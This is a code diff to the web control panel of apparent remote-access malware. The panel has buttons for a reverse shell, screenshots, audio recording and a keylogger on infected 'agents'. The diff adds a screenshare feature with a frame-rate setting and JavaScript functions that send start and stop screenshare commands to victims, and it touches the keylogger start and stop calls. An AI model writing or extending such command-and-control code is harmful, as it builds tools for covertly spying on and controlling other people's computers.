@@ -752,12 +752,23 @@
                 <button onclick="showSectionInPanelForAgentActions('reverseShell')">Open Reverse Shell</button>
                 <button onclick="showSectionInPanelForAgentActions('screenshot')">Capture Screenshot</button>
                 <button onclick="showSectionInPanelForAgentActions('audio')">Record Audio</button>
+                <button onclick="showSectionInPanelForAgentActions('screenshare')">Screenshare</button>
                 <button class="close-modal" onclick="closeMalwareActionsModal()">×</button>
             </div>
             <div class="content-panel">
                 <div id="agentInfo" class="content-section">
                     <h3>Agent Information</h3>
                     <div id="agentInfoDetails"></div>
+                </div>
+                <div id="screenshare" class="content-section">
+                    <h2>Screenshare Command</h2><br>
+                    <label for="fpsInput" style="display: inline-block; vertical-align: middle;">Frame Rate (1-20
+                        FPS):</label>
+                    <input type="number" id="fpsInput" min="1" max="20" value="10"
+                        style="width: 30%; margin-top: 10px; display: inline-block; vertical-align: middle;">
+
+                    <button onclick="startScreenshare()">Start Screenshare</button>
+                    <button onclick="stopScreenshare()">Stop Screenshare</button>
                 </div>
                 <div id="sendFile" class="content-section">
                     <h3>Send File</h3>
@@ -1249,7 +1260,7 @@
             fetch('/input-command-to-execute-from-web', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ clientid: currentClientId, command:"start_keylog" })
+                body: JSON.stringify({ clientid: currentClientId, command: "start_keylog" })
             })
 
             alert(`Keylogger module activated on agent ${currentClientId}`);
@@ -1259,7 +1270,7 @@
             fetch('/input-command-to-execute-from-web', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ clientid: currentClientId, command:"stop_keylog" })
+                body: JSON.stringify({ clientid: currentClientId, command: "stop_keylog" })
             })
             alert(`Keylogger module deactivated on agent ${currentClientId}`);
             logAction(`Stopped keylogger on ${currentClientId}`);
@@ -1289,6 +1300,46 @@
                 .then(response => response.json())
                 .then(data => {
                     logAction(`Command send to take screenshot to "${currentClientId}".`);
+                    if (data.status) {
+
+                        alert(data.status);
+                    }
+                })
+                .catch(error => {
+                    alert("Failed to send the command. Please try again.");
+                    console.error('Error:', error);
+                });
+        }
+        
+        function startScreenshare() {
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command: "start_screenshare" })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    logAction(`Command send to share screen to "${currentClientId}".`);
+                    if (data.status) {
+
+                        alert(data.status);
+                    }
+                })
+                .catch(error => {
+                    alert("Failed to send the command. Please try again.");
+                    console.error('Error:', error);
+                });
+        }
+
+        function stopScreenshare() {
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command: "stop_screenshare" })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    logAction(`Command send to stop screen sharing to "${currentClientId}".`);
                     if (data.status) {
 
                         alert(data.status);
